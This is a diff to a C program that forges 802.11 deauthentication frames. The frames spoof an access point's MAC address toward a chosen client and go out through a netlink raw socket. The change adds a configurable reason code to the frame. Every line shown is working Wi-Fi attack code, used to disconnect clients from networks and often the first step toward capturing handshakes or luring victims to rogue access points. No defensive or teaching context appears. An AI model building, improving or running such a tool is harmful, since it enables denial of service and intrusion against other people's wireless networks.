@@ -103,13 +103,14 @@ static int send_frame(int sock, int ifidx, const unsigned char *frame, int flen,
 }
 
 int main(int argc, char **argv) {
-    if (argc != 5) {
-        fprintf(stderr, "Usage: %s <iface> <ap_mac> <client_mac> <freq>\n", argv[0]);
+    if (argc < 5) {
+        fprintf(stderr, "Usage: %s <iface> <ap_mac> <client_mac> <freq> [reason_code]\n", argv[0]);
         return 1;
     }
     
     const char *iface = argv[1];
     int freq = atoi(argv[4]);
+    int reason = (argc >= 6) ? atoi(argv[5]) : 7;  // default: class 3 from non-associated
     
     unsigned char ap[6], cl[6];
     for (int i = 0; i < 6; i++) {
@@ -117,13 +118,15 @@ int main(int argc, char **argv) {
         sscanf(argv[3] + i*3, "%2hhx:", &cl[i]);
     }
     
-    // Deauth frame: C0 00 [dur] [RA=cl] [TA=ap] [BSSID=ap] [seq] 07 00
+    // Deauth frame: C0 00 [dur] [RA=cl] [TA=ap] [BSSID=ap] [seq] <reason LE>
     unsigned char frame[] = {
         0xC0, 0x00, 0x3A, 0x01,
         0,0,0,0,0,0, 0,0,0,0,0,0, 0,0,0,0,0,0,
-        0,0, 7,0
+        0,0, 0,0
     };
     memcpy(frame+4, cl, 6); memcpy(frame+10, ap, 6); memcpy(frame+16, ap, 6);
+    frame[22] = reason & 0xFF;
+    frame[23] = (reason >> 8) & 0xFF;
     
     int sock = socket(AF_NETLINK, SOCK_RAW, NETLINK_GENERIC);
     if (sock < 0) { perror("socket"); return 1; }
